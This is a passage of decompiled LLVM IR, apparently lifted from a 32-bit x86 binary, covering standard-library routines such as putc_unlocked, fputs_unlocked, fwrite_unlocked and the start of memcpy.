  %v4_804f471 = or i1 %v12_804f46f, %v3_804f471
  %v5_804f471 = zext i1 %v4_804f471 to i32
  store i32 %v5_804f471, i32* %eax.global-to-local, align 4
  %v1_804f477 = icmp eq i1 %v4_804f471, false
  br i1 %v1_804f477, label %dec_label_pc_804f48b, label %dec_label_pc_804f461.dec_label_pc_804f47b_crit_edge

dec_label_pc_804f461.dec_label_pc_804f47b_crit_edge: ; preds = %dec_label_pc_804f461
  %v0_804f47b.pre = load i32, i32* @esp, align 4
  %v1_804f47b.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f47b

dec_label_pc_804f47b:                             ; preds = %dec_label_pc_804f461.dec_label_pc_804f47b_crit_edge, %dec_label_pc_804f45d, %dec_label_pc_804f458
  %v1_804f47b = phi i32 [ %v1_804f47b.pre, %dec_label_pc_804f461.dec_label_pc_804f47b_crit_edge ], [ %v1_804f44b, %dec_label_pc_804f45d ], [ %v1_804f44b, %dec_label_pc_804f458 ]
  %v0_804f47b = phi i32 [ %v0_804f47b.pre, %dec_label_pc_804f461.dec_label_pc_804f47b_crit_edge ], [ %v0_804f44b, %dec_label_pc_804f45d ], [ %v0_804f44b, %dec_label_pc_804f458 ]
  %v2_804f47b = mul i32 %v1_804f47b, 4
  %v3_804f47b = add i32 %v0_804f47b, 80
  %v4_804f47b = add i32 %v3_804f47b, %v2_804f47b
  %v5_804f47b = inttoptr i32 %v4_804f47b to i32*
  %v6_804f47b = load i32, i32* %v5_804f47b, align 4
  store i32 %v6_804f47b, i32* %eax.global-to-local, align 4
  store i32 %v1_804f442, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_804f47b, i32* %v5_804f44f, align 4
  br label %dec_label_pc_804f48b

dec_label_pc_804f48b:                             ; preds = %dec_label_pc_804f461, %dec_label_pc_804f442, %dec_label_pc_804f47b
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804f48f = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f48f = add i32 %v0_804f48f, 1
  store i32 %v1_804f48f, i32* %ebp.global-to-local, align 4
  %v3_804f490 = load i32, i32* %v2_804f490, align 4
  %v1_804f493 = add i32 %v3_804f490, 2
  store i32 %v1_804f493, i32* %eax.global-to-local, align 4
  %v5_804f498 = icmp slt i32 %v1_804f48f, %v1_804f493
  br i1 %v5_804f498, label %dec_label_pc_804f410, label %dec_label_pc_804f4c6

dec_label_pc_804f49f:                             ; preds = %dec_label_pc_804f403
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804f4a3 = add i32 %tmp76, 38
  %v2_804f4a3 = inttoptr i32 %v1_804f4a3 to i8*
  store i8 1, i8* %v2_804f4a3, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804f4ac = add i32 %tmp76, 28
  %v2_804f4ac = inttoptr i32 %v1_804f4ac to i32*
  %v3_804f4ac = load i32, i32* %v2_804f4ac, align 4
  %v2_804f4af = mul i32 %v3_804f4ac, 4
  %v2_804f4b3 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804f4ba = add i32 %tmp76, 40
  store i32 %v1_804f4ba, i32* %eax.global-to-local, align 4
  %v3_804f4be = inttoptr i32 %v1_804f4ba to i16*
  %v4_804f4be = call i32 @memcpy(i16* %v3_804f4be, i32 %v2_804f4b3, i32 %v2_804f4af)
  store i32 %v4_804f4be, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f4c6

dec_label_pc_804f4c6:                             ; preds = %dec_label_pc_804f48b, %dec_label_pc_804f49f
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804f49f ], [ %stack_var_-88.5, %dec_label_pc_804f48b ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_804f4ce = inttoptr i32 %v1_804f16f to i8*
  %v3_804f4ce = load i8, i8* %v2_804f4ce, align 1
  %v5_804f4ce = icmp slt i8 %v3_804f4ce, 0
  store i32 %stack_var_-88.6, i32* %v2_804f168, align 4
  br i1 %v5_804f4ce, label %dec_label_pc_804f4de, label %dec_label_pc_804f4d7

dec_label_pc_804f4d7:                             ; preds = %dec_label_pc_804f4c6
  %v0_804f4d7 = load i32, i32* @esi, align 4
  %v1_804f4d7 = add i32 %v0_804f4d7, 1
  store i32 %v1_804f4d7, i32* %eax.global-to-local, align 4
  %v1_804f4da = load i32, i32* @ecx, align 4
  %v2_804f4da = inttoptr i32 %v1_804f4da to i32*
  store i32 %v1_804f4d7, i32* %v2_804f4da, align 4
  br label %dec_label_pc_804f4f1

dec_label_pc_804f4de:                             ; preds = %dec_label_pc_804f4c6
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_804f13c, i32* %edx.global-to-local, align 4
  %v0_804f4e6 = load i32, i32* @esi, align 4
  %v2_804f4e6 = sub i32 %v0_804f4e6, %v4_804f13c
  store i32 %v2_804f4e6, i32* %esi.global-to-local, align 4
  %v1_804f4e8 = mul i32 %v2_804f4e6, 4
  %v2_804f4e8 = add i32 %v1_804f4e8, 224
  store i32 %v2_804f4e8, i32* %eax.global-to-local, align 4
  %v2_804f4ef = load i32, i32* %arg1, align 4
  %v4_804f4ef = add i32 %v2_804f4ef, %v2_804f4e8
  store i32 %v4_804f4ef, i32* %arg1, align 4
  br label %dec_label_pc_804f4f1

dec_label_pc_804f4f1:                             ; preds = %dec_label_pc_804f4d7, %dec_label_pc_804f4de
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f4f5 = add i32 %tmp76, 28
  %v2_804f4f5 = inttoptr i32 %v1_804f4f5 to i32*
  %v3_804f4f5 = load i32, i32* %v2_804f4f5, align 4
  store i32 %v3_804f4f5, i32* %eax.global-to-local, align 4
  %v1_804f4f8 = add i32 %v3_804f4f5, 2
  br label %dec_label_pc_804f500

dec_label_pc_804f4fd:                             ; preds = %dec_label_pc_804f18d, %dec_label_pc_804f227, %dec_label_pc_804f25a, %dec_label_pc_804f2d5, %dec_label_pc_804f2c1, %dec_label_pc_804f2b8, %dec_label_pc_804f435, %dec_label_pc_804f3ec, %dec_label_pc_804f337
  br label %dec_label_pc_804f500

dec_label_pc_804f500:                             ; preds = %dec_label_pc_804f4f1, %dec_label_pc_804f4fd
  %storemerge6 = phi i32 [ %v1_804f4f8, %dec_label_pc_804f4f1 ], [ -1, %dec_label_pc_804f4fd ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804f503 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f503, i32* @ebx, align 4
  store i32 %v0_804f13b, i32* @esi, align 4
  store i32 %v0_804f13a, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_804f48f, { 0, 2, 1 }
  uselistorder i32 %v2_804f46f, { 1, 2, 0 }
  uselistorder i32 %v1_804f461, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f442, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804f435, { 1, 0 }
  uselistorder i32 %v5_804f42f, { 1, 2, 0 }
  uselistorder i32 %v0_804f442, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804f410, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804f426, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_804f3a1, { 1, 2, 0 }
  uselistorder i32 %v1_804f377, { 1, 2, 0 }
  uselistorder i32 %v0_804f3a1, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804f33d, { 1, 0 }
  uselistorder i32 %v1_804f32a, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804f333, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804f31d, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804f313, { 1, 0 }
  uselistorder i32 %v1_804f2f5, { 1, 0 }
  uselistorder i32 %v0_804f313.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804f2d8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804f2cf, { 1, 2, 0 }
  uselistorder i32 %v0_804f295, { 1, 0 }
  uselistorder i32 %v1_804f287, { 1, 0 }
  uselistorder i32 %v1_804f282, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804f280, { 2, 0, 1 }
  uselistorder i32 %v0_804f2a2, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804f23d, { 1, 2, 0 }
  uselistorder i32 %v0_804f215, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_804f20b, { 1, 2, 0 }
  uselistorder i32 %v6_804f209, { 0, 2, 1 }
  uselistorder i32 %v0_804f208, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_804f201, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_804f201, { 2, 1, 0 }
  uselistorder i32 %v1_804f1f9, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_804f1df, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804f1b5, { 0, 2, 1 }
  uselistorder i32 %v0_804f1a2, { 2, 0, 1 }
  uselistorder i32 %v4_804f13c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0 }
  uselistorder i32 -5, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -134559403, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_80536b5.109 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804f500, { 1, 0 }
  uselistorder label %dec_label_pc_804f4fd, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f4f1, { 1, 0 }
  uselistorder label %dec_label_pc_804f4c6, { 1, 0 }
  uselistorder label %dec_label_pc_804f48b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f42f, { 1, 0 }
  uselistorder label %dec_label_pc_804f403, { 1, 0 }
  uselistorder label %dec_label_pc_804f36b, { 1, 0 }
  uselistorder label %dec_label_pc_804f337, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f30e, { 1, 0 }
  uselistorder label %dec_label_pc_804f2e5, { 1, 0 }
  uselistorder label %dec_label_pc_804f2ac, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804f24f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f209, { 1, 0 }
  uselistorder label %dec_label_pc_804f208, { 1, 0 }
  uselistorder label %dec_label_pc_804f1ef, { 1, 0 }
  uselistorder label %dec_label_pc_804f1d8, { 1, 0 }
  uselistorder label %dec_label_pc_804f1d8.outer, { 2, 0, 1 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_804f509 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_804f511 = sext i8 %arg1 to i32
  store i32 %v4_804f511, i32* @esi, align 4
  %v1_804f515 = add i32 %arg2, 16
  %v2_804f515 = inttoptr i32 %v1_804f515 to i32*
  %v3_804f515 = load i32, i32* %v2_804f515, align 4
  store i32 %v3_804f515, i32* %eax.global-to-local, align 4
  %v2_804f518 = add i32 %arg2, 28
  %v3_804f518 = inttoptr i32 %v2_804f518 to i32*
  %v4_804f518 = load i32, i32* %v3_804f518, align 4
  %v10_804f518 = icmp ult i32 %v3_804f515, %v4_804f518
  %v1_804f51b = icmp eq i1 %v10_804f518, false
  br i1 %v1_804f51b, label %dec_label_pc_804f527, label %dec_label_pc_804f51d

dec_label_pc_804f51d:                             ; preds = %entry
  store i32 %v4_804f511, i32* %edx.global-to-local, align 4
  %v3_804f51f = inttoptr i32 %v3_804f515 to i8*
  store i8 %arg1, i8* %v3_804f51f, align 1
  %v0_804f521 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f521 = add i32 %v0_804f521, 1
  store i32 %v1_804f521, i32* %eax.global-to-local, align 4
  %v1_804f522 = load i32, i32* @ebx, align 4
  %v2_804f522 = add i32 %v1_804f522, 16
  %v3_804f522 = inttoptr i32 %v2_804f522 to i32*
  store i32 %v1_804f521, i32* %v3_804f522, align 4
  %v0_804f552.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f552

dec_label_pc_804f527:                             ; preds = %entry
  %v1_804f527 = inttoptr i32 %arg2 to i16*
  %v2_804f527 = load i16, i16* %v1_804f527, align 2
  %v3_804f527 = zext i16 %v2_804f527 to i32
  %v1_804f52a = and i32 %v3_804f527, 192
  store i32 %v1_804f52a, i32* %eax.global-to-local, align 4
  %v6_804f52f = icmp eq i32 %v1_804f52a, 192
  br i1 %v6_804f52f, label %dec_label_pc_804f54a, label %dec_label_pc_804f536

dec_label_pc_804f536:                             ; preds = %dec_label_pc_804f527
  %v0_804f536 = load i32, i32* @edx, align 4
  %v6_804f53e = call i32 @__stdio_trans2w_o(i16* %v1_804f527, i32 128, i32 %v0_804f536, i32 %v0_804f536)
  store i32 %v6_804f53e, i32* %eax.global-to-local, align 4
  %v1_804f546 = icmp eq i32 %v6_804f53e, 0
  %v1_804f548 = icmp eq i1 %v1_804f546, false
  br i1 %v1_804f548, label %dec_label_pc_804f5ba, label %dec_label_pc_804f536.dec_label_pc_804f54a_crit_edge

dec_label_pc_804f536.dec_label_pc_804f54a_crit_edge: ; preds = %dec_label_pc_804f536
  %v0_804f54a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f54a

dec_label_pc_804f54a:                             ; preds = %dec_label_pc_804f536.dec_label_pc_804f54a_crit_edge, %dec_label_pc_804f527
  %v0_804f5ad = phi i32 [ %v0_804f54a.pre, %dec_label_pc_804f536.dec_label_pc_804f54a_crit_edge ], [ %arg2, %dec_label_pc_804f527 ]
  %v1_804f54a = add i32 %v0_804f5ad, 4
  %v2_804f54a = inttoptr i32 %v1_804f54a to i32*
  %v3_804f54a = load i32, i32* %v2_804f54a, align 4
  %v13_804f54a = icmp eq i32 %v3_804f54a, -2
  %v1_804f54e = icmp eq i1 %v13_804f54a, false
  br i1 %v1_804f54e, label %dec_label_pc_804f557, label %dec_label_pc_804f550

dec_label_pc_804f550:                             ; preds = %dec_label_pc_804f59f, %dec_label_pc_804f58a, %dec_label_pc_804f585, %dec_label_pc_804f574, %dec_label_pc_804f54a
  %v0_804f550 = load i32, i32* @esi, align 4
  store i32 %v0_804f550, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f552

dec_label_pc_804f552:                             ; preds = %dec_label_pc_804f51d, %dec_label_pc_804f550
  %v0_804f552 = phi i32 [ %v0_804f552.pre, %dec_label_pc_804f51d ], [ %v0_804f550, %dec_label_pc_804f550 ]
  %v1_804f552 = urem i32 %v0_804f552, 256
  br label %dec_label_pc_804f5bd

dec_label_pc_804f557:                             ; preds = %dec_label_pc_804f54a
  %v1_804f557 = add i32 %v0_804f5ad, 12
  %v2_804f557 = inttoptr i32 %v1_804f557 to i32*
  %v3_804f557 = load i32, i32* %v2_804f557, align 4
  store i32 %v3_804f557, i32* %eax.global-to-local, align 4
  %v2_804f55a = add i32 %v0_804f5ad, 8
  %v3_804f55a = inttoptr i32 %v2_804f55a to i32*
  %v4_804f55a = load i32, i32* %v3_804f55a, align 4
  %v15_804f55a = icmp eq i32 %v3_804f557, %v4_804f55a
  br i1 %v15_804f55a, label %dec_label_pc_804f59f, label %dec_label_pc_804f55f

dec_label_pc_804f55f:                             ; preds = %dec_label_pc_804f557
  %v2_804f55f = add i32 %v0_804f5ad, 16
  %v3_804f55f = inttoptr i32 %v2_804f55f to i32*
  %v4_804f55f = load i32, i32* %v3_804f55f, align 4
  %v15_804f55f = icmp eq i32 %v3_804f557, %v4_804f55f
  %v1_804f562 = icmp eq i1 %v15_804f55f, false
  br i1 %v1_804f562, label %dec_label_pc_804f574, label %dec_label_pc_804f564

dec_label_pc_804f564:                             ; preds = %dec_label_pc_804f55f
  %v2_804f568 = call i32 @__stdio_wcommit(i32 %v0_804f5ad)
  store i32 %v2_804f568, i32* %eax.global-to-local, align 4
  %v1_804f570 = icmp eq i32 %v2_804f568, 0
  %v1_804f572 = icmp eq i1 %v1_804f570, false
  br i1 %v1_804f572, label %dec_label_pc_804f5ba, label %dec_label_pc_804f564.dec_label_pc_804f574_crit_edge

dec_label_pc_804f564.dec_label_pc_804f574_crit_edge: ; preds = %dec_label_pc_804f564
  %v0_804f574.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f574

dec_label_pc_804f574:                             ; preds = %dec_label_pc_804f564.dec_label_pc_804f574_crit_edge, %dec_label_pc_804f55f
  %v0_804f574 = phi i32 [ %v0_804f574.pre, %dec_label_pc_804f564.dec_label_pc_804f574_crit_edge ], [ %v0_804f5ad, %dec_label_pc_804f55f ]
  %v1_804f574 = add i32 %v0_804f574, 16
  %v2_804f574 = inttoptr i32 %v1_804f574 to i32*
  %v3_804f574 = load i32, i32* %v2_804f574, align 4
  store i32 %v3_804f574, i32* %eax.global-to-local, align 4
  %v0_804f577 = load i32, i32* @esi, align 4
  store i32 %v0_804f577, i32* %edx.global-to-local, align 4
  %v1_804f579 = trunc i32 %v0_804f577 to i8
  %v3_804f579 = inttoptr i32 %v3_804f574 to i8*
  store i8 %v1_804f579, i8* %v3_804f579, align 1
  %v0_804f57b = load i32, i32* %eax.global-to-local, align 4
  %v1_804f57b = add i32 %v0_804f57b, 1
  store i32 %v1_804f57b, i32* %eax.global-to-local, align 4
  %v0_804f57c = load i32, i32* @ebx, align 4
  %v1_804f57c = add i32 %v0_804f57c, 1
  %v2_804f57c = inttoptr i32 %v1_804f57c to i8*
  %v3_804f57c = load i8, i8* %v2_804f57c, align 1
  %v4_804f57c = urem i8 %v3_804f57c, 2
  %v5_804f57c = icmp eq i8 %v4_804f57c, 0
  %v2_804f580 = add i32 %v0_804f57c, 16
  %v3_804f580 = inttoptr i32 %v2_804f580 to i32*
  store i32 %v1_804f57b, i32* %v3_804f580, align 4
  br i1 %v5_804f57c, label %dec_label_pc_804f550, label %dec_label_pc_804f585

dec_label_pc_804f585:                             ; preds = %dec_label_pc_804f574
  %v0_804f585 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f585 = trunc i32 %v0_804f585 to i8
  %v10_804f585 = icmp eq i8 %v1_804f585, 10
  %v1_804f588 = icmp eq i1 %v10_804f585, false
  br i1 %v1_804f588, label %dec_label_pc_804f550, label %dec_label_pc_804f58a

dec_label_pc_804f58a:                             ; preds = %dec_label_pc_804f585
  %v0_804f58d = load i32, i32* @ebx, align 4
  %v2_804f58e = call i32 @__stdio_wcommit(i32 %v0_804f58d)
  store i32 %v2_804f58e, i32* %eax.global-to-local, align 4
  %v1_804f596 = icmp eq i32 %v2_804f58e, 0
  br i1 %v1_804f596, label %dec_label_pc_804f550, label %dec_label_pc_804f59a

dec_label_pc_804f59a:                             ; preds = %dec_label_pc_804f58a
  %v0_804f59a = load i32, i32* @ebx, align 4
  %v1_804f59a = add i32 %v0_804f59a, 16
  %v2_804f59a = inttoptr i32 %v1_804f59a to i32*
  %v3_804f59a = load i32, i32* %v2_804f59a, align 4
  %v4_804f59a = add i32 %v3_804f59a, -1
  store i32 %v4_804f59a, i32* %v2_804f59a, align 4
  br label %dec_label_pc_804f5ba

dec_label_pc_804f59f:                             ; preds = %dec_label_pc_804f557
  %v0_804f59f = load i32, i32* @esi, align 4
  %v6_804f5a1 = trunc i32 %v0_804f59f to i8
  store i8 %v6_804f5a1, i8* %stack_var_-9, align 1
  %v2_804f5a8 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_804f5a8, i32* %eax.global-to-local, align 4
  %v5_804f5ad = inttoptr i32 %v0_804f5ad to i16*
  %v6_804f5ae = call i32 @__stdio_WRITE(i16* %v5_804f5ad, i32 %v2_804f5a8, i32 1, i32 %v3_804f557)
  store i32 %v6_804f5ae, i32* %eax.global-to-local, align 4
  %v1_804f5b6 = icmp eq i32 %v6_804f5ae, 0
  %v1_804f5b8 = icmp eq i1 %v1_804f5b6, false
  br i1 %v1_804f5b8, label %dec_label_pc_804f550, label %dec_label_pc_804f5ba

dec_label_pc_804f5ba:                             ; preds = %dec_label_pc_804f59f, %dec_label_pc_804f564, %dec_label_pc_804f536, %dec_label_pc_804f59a
  br label %dec_label_pc_804f5bd

dec_label_pc_804f5bd:                             ; preds = %dec_label_pc_804f552, %dec_label_pc_804f5ba
  %storemerge = phi i32 [ %v1_804f552, %dec_label_pc_804f552 ], [ -1, %dec_label_pc_804f5ba ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804f509, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_804f557, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804f5ad, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %eax.global-to-local, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_804f5bd, { 1, 0 }
  uselistorder label %dec_label_pc_804f5ba, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_804f552, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804f5c4 = load i32, i32* @esi, align 4
  %v0_804f5c5 = load i32, i32* @ebx, align 4
  store i32 %v0_804f5c5, i32* %stack_var_-8, align 4
  %v4_804f5c9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f5c9, i32* @ebx, align 4
  %v3_804f5ce = call i32 @strlen(i8* %arg1)
  store i32 %v3_804f5ce, i32* @esi, align 4
  %v0_804f5df = load i32, i32* @ebx, align 4
  %v6_804f5e0 = call i32 @__GI_fwrite_unlocked(i32 %v0_804f5df, i64 1, i32 %v3_804f5ce, i32 %arg2)
  store i32 %v6_804f5e0, i32* @edx, align 4
  %v1_804f5ea = load i32, i32* @esi, align 4
  %v12_804f5ea = icmp eq i32 %v6_804f5e0, %v1_804f5ea
  %v3_804f5ec = select i1 %v12_804f5ea, i32 %v6_804f5e0, i32 -1
  %v2_804f5f2 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f5f2, i32* @ebx, align 4
  store i32 %v0_804f5c4, i32* @esi, align 4
  ret i32 %v3_804f5ec

; uselistorder directives
  uselistorder i32 %v6_804f5e0, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804f5f8 = load i32, i32* @edi, align 4
  %v0_804f5f9 = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804f5ff = trunc i64 %arg2 to i32
  store i32 %v4_804f5ff, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804f607 = inttoptr i32 %arg4 to i16*
  %v2_804f607 = load i16, i16* %v1_804f607, align 2
  %v1_804f60a = and i16 %v2_804f607, 192
  %v6_804f60f = icmp eq i16 %v1_804f60a, 192
  br i1 %v6_804f60f, label %dec_label_pc_804f62a, label %dec_label_pc_804f616

dec_label_pc_804f616:                             ; preds = %entry
  %v0_804f616 = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_804f61e = call i32 @__stdio_trans2w_o(i16* %v1_804f607, i32 128, i32 %v0_804f616, i32 %v0_804f616)
  %v1_804f626 = icmp eq i32 %v6_804f61e, 0
  %v1_804f628 = icmp eq i1 %v1_804f626, false
  br i1 %v1_804f628, label %dec_label_pc_804f66a, label %dec_label_pc_804f62a

dec_label_pc_804f62a:                             ; preds = %dec_label_pc_804f616, %entry
  %v2_804f62a = icmp eq i32 %v4_804f5ff, 0
  br i1 %v2_804f62a, label %dec_label_pc_804f66a, label %dec_label_pc_804f62e

dec_label_pc_804f62e:                             ; preds = %dec_label_pc_804f62a
  %v1_804f62e = icmp eq i32 %arg3, 0
  br i1 %v1_804f62e, label %dec_label_pc_804f66a, label %dec_label_pc_804f632

dec_label_pc_804f632:                             ; preds = %dec_label_pc_804f62e
  %v9_804f637 = udiv i64 4294967295, %arg2
  %v10_804f637 = trunc i64 %v9_804f637 to i32
  %v6_804f63b = icmp ult i32 %v10_804f637, %arg3
  br i1 %v6_804f63b, label %dec_label_pc_804f657, label %dec_label_pc_804f63d

dec_label_pc_804f63d:                             ; preds = %dec_label_pc_804f632
  %sext = mul i64 %arg2, 4294967296
  %v2_804f640 = sdiv i64 %sext, 4294967296
  %v3_804f640 = sext i32 %arg3 to i64
  %v4_804f640 = mul nsw i64 %v3_804f640, %v2_804f640
  %v5_804f640 = trunc i64 %v4_804f640 to i32
  %v0_804f643 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804f649 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804f640, i32 %v0_804f643, i32 %v10_804f637)
  %v6_804f649 = sext i32 %v5_804f649 to i64
  %v10_804f653 = udiv i64 %v6_804f649, %arg2
  %v11_804f653 = trunc i64 %v10_804f653 to i32
  br label %dec_label_pc_804f66c

dec_label_pc_804f657:                             ; preds = %dec_label_pc_804f632
  %v0_804f657 = load i32, i32* @ebx, align 4
  %v1_804f657 = inttoptr i32 %v0_804f657 to i32*
  %v2_804f657 = load i32, i32* %v1_804f657, align 4
  %v1_804f659 = or i32 %v2_804f657, 8
  %v1_804f65c = trunc i32 %v1_804f659 to i16
  %v3_804f65c = inttoptr i32 %v0_804f657 to i16*
  store i16 %v1_804f65c, i16* %v3_804f65c, align 2
  %v0_804f65f = load i32, i32* %stack_var_-28, align 4
  %v1_804f65f = call i32 @__errno_location(i32 %v0_804f65f)
  %v1_804f664 = inttoptr i32 %v1_804f65f to i32*
  store i32 22, i32* %v1_804f664, align 4
  br label %dec_label_pc_804f66a

dec_label_pc_804f66a:                             ; preds = %dec_label_pc_804f62e, %dec_label_pc_804f62a, %dec_label_pc_804f616, %dec_label_pc_804f657
  br label %dec_label_pc_804f66c

dec_label_pc_804f66c:                             ; preds = %dec_label_pc_804f63d, %dec_label_pc_804f66a
  %v0_804f66f = phi i32 [ %v11_804f653, %dec_label_pc_804f63d ], [ 0, %dec_label_pc_804f66a ]
  store i32 %v0_804f5f9, i32* @esi, align 4
  store i32 %v0_804f5f8, i32* @edi, align 4
  ret i32 %v0_804f66f

; uselistorder directives
  uselistorder i32 %v0_804f616, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f66c, { 1, 0 }
  uselistorder label %dec_label_pc_804f66a, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f671 = load i32, i32* @esi, align 4
  store i32 %v0_804f671, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804f672 = sdiv i32 %sext, 16777216
  store i32 %v4_804f672, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f67a = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f67a, i32* %edi.global-to-local, align 4
  %v2_804f680 = udiv i32 %v4_804f672, 4
  %v3_804f683 = inttoptr i32 %arg2 to i8*
  %v4_804f683 = bitcast i16* %arg1 to i8*
  %v5_804f683 = call i8* @_memcpy(i8* %v4_804f683, i8* %v3_804f683, i32 %v2_804f680)
  %v6_804f683 = ptrtoint i8* %v5_804f683 to i32
  store i32 %v6_804f683, i32* @ecx, align 4
  %v0_804f685 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f685 = and i32 %v0_804f685, 2
  %v3_804f685 = icmp eq i32 %v2_804f685, 0
  br i1 %v3_804f685, label %dec_label_pc_804f68b, label %dec_label_pc_804f689

